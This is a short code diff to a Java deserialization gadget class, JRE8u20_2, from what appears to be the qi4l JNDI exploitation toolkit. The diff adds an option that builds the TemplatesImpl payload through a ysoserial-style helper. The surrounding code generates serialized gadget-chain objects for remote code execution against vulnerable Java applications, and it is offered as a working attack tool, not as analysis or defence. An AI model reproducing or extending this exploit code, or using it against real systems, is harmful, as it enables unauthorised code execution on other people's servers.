@@ -1,10 +1,7 @@
 package com.qi4l.jndi.gadgets;
 
 import com.qi4l.jndi.enumtypes.PayloadType;
-import com.qi4l.jndi.gadgets.utils.ByteUtil;
-import com.qi4l.jndi.gadgets.utils.Gadgets;
-import com.qi4l.jndi.gadgets.utils.Reflections;
-import com.qi4l.jndi.gadgets.utils.Serializer;
+import com.qi4l.jndi.gadgets.utils.*;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
@@ -17,6 +14,8 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.LinkedHashSet;
 import java.util.Map;
+
+import static com.qi4l.jndi.Starter.cmdLine;
 
 public class  JRE8u20_2 implements ObjectPayload<Object> {
     public static Class newInvocationHandlerClass() throws Exception {
@@ -33,7 +32,12 @@ public class  JRE8u20_2 implements ObjectPayload<Object> {
 
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
-        Object templates = Gadgets.createTemplatesImpl(type,param);
+        final Object templates;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            templates = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            templates = Gadgets.createTemplatesImpl(type, param);
+        }
 
         Class       ihClass     = newInvocationHandlerClass();
         Constructor constructor = ihClass.getDeclaredConstructor(Class.class, Map.class);
